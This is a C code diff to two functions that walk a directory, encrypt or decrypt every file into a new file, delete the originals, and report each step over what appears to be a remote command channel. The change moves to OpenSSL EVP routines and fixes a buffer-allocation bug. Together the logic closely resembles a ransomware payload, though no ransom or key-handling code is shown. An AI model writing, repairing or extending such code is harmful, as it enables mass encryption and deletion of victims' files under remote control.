@@ -43,6 +43,7 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
 
     char *newName, *toVisit, *process;
     FILE *old, *newone;
+    int process_length = 0;
 
     while ((dir = readdir(dr)) != NULL) {
         if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ext) == NULL) {
@@ -52,7 +53,7 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
                 old = fopen(toVisit, "rb");
                 newone = fopen(newName, "wb");
 
-                encrypt(old, newone, key, iv);
+                evp_encrypt(old, newone, key, iv);
                 deleteFile(toVisit);
 
                 fclose(old);
@@ -60,6 +61,8 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
 
                 free(newName);
             } else {
+                process_length = snprintf((char *)NULL, 0, "Encrypting %s\n", dir->d_name);
+                process = (char *)calloc(process_length+1, sizeof(char));
                 sprintf(process, "Encrypting %s\n", dir->d_name);
                 send_channel(channel, process);
                 free(process);
@@ -80,6 +83,7 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
         return 0;
 
     char *newName, *toVisit, *process;
+    int process_length = 0;
     FILE *old, *newone;
 
     while ((dir = readdir(dr)) != NULL) {
@@ -90,7 +94,7 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
                 old = fopen(toVisit, "rb");
                 newone = fopen(newName, "wb");
 
-                decrypt(old, newone, key, iv);
+                evp_decrypt(old, newone, key, iv);
                 deleteFile(toVisit);
 
                 fclose(old);
@@ -98,6 +102,8 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
 
                 free(newName);
             } else {
+                process_length = snprintf((char *)NULL, 0, "Decrypting %s\n", dir->d_name);
+                process = (char *)calloc(process_length+1, sizeof(char));
                 sprintf(process, "Decrypting %s\n", dir->d_name);
                 send_channel(channel, process);
                 free(process);
